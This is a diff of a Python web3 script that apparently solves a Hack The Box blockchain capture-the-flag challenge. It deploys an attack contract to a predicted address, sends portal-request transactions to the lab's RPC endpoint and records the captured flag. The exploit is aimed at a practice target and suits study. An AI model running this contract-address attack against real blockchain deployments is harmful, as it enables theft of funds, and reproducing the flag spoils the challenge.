@@ -17,9 +17,9 @@ TargetContract = x["TargetAddress"]
 SetupContract =  x["setupAddress"]
 
 #Attack Contract address
-Target2Contract = "0x2B5d196C89fed034a97fa56a87E520a0C5e0833C"
+#Target2Contract = "0x2B5d196C89fed034a97fa56a87E520a0C5e0833C"
 
-url = 'http://157.245.37.125:31610/rpc'
+url = 'http://157.245.43.189:31608/rpc'
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -29,6 +29,16 @@ account_address = Address
 balance = w3.eth.get_balance(account_address)
 print(balance)
 block = w3.eth.get_block(block_number)
+
+'''
+all_accounts = w3.eth.accounts
+
+print("All accounts in the network:")
+for account in all_accounts:
+	print(account)
+balance = w3.eth.get_balance("0xA97f676665a225a310712ECfFefc9e5Ca37be187")
+print(balance)
+'''
 
 #print(block)
 #print(w3.eth.get_code(TargetContract))
@@ -74,6 +84,8 @@ install_solc("0.8.13")
 #number = contract_instance2.functions.createPortal("dawrfKingdom").call()
 #print(number)
 
+#Run deploy.sh under Contract first, to deploy the attack contract to orcKingdom address
+
 compiled = compile_files(["Portal.sol"], output_values=["abi"], solc_version="0.8.13")
 abi = compiled['Portal.sol:PortalStation']['abi']
 contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
@@ -102,42 +114,6 @@ tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
 tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
 print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
 
-sender_private_key = account_from['private_key']
-sender_address = "0x0000000000000000000000000000000000000000"
-receiver_address = account_from['address']
-
-# Build transaction
-transaction = {
-    'to': receiver_address,
-    'value': w3.to_wei(14, 'ether'),  # Amount in wei
-    'gas': 2000000,  # Adjust gas limit as needed
-    'gasPrice': w3.to_wei('50', 'gwei'),  # Adjust gas price as needed
-    #'nonce': w3.eth.get_transaction_count(sender_address),
-    'nonce': w3.eth.get_transaction_count(account_from['address']),
-}
-
-# Sign and send the transaction
-signed_transaction = w3.eth.account.sign_transaction(transaction, sender_private_key)
-transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
-
-
-construct_txn = contract_instance2.functions.requestPortal("orcKingdom").build_transaction(
-        {
-                'from': account_from['address'],
-                'nonce': w3.eth.get_transaction_count(account_from['address']),
-                #'from': Target2Address,
-                #'nonce': w3.eth.get_transaction_count(Target2Address),
-                'chainId': w3.eth.chain_id,
-                'value' : w3.to_wei(1338, 'ether'),
-                #"gasPrice": w3.to_wei(50, 'gwei'),
-                #"gas": 21000,
-                #"value": w3.to_wei("0", "ether"),
-        }
-)
-tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
-tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
-tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
-print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
 
 compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.13")
 abi = compiled['Setup.sol:Setup']['abi']
@@ -146,7 +122,7 @@ contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
 number = contract_instance.functions.isSolved().call()
 
 print(f'The current number stored is: { number } ')
-#
+#HTB{7h3_4dd2355_0f_4_c0n724c7_15_41m057_d3732m1n1571c}
 
 
 '''
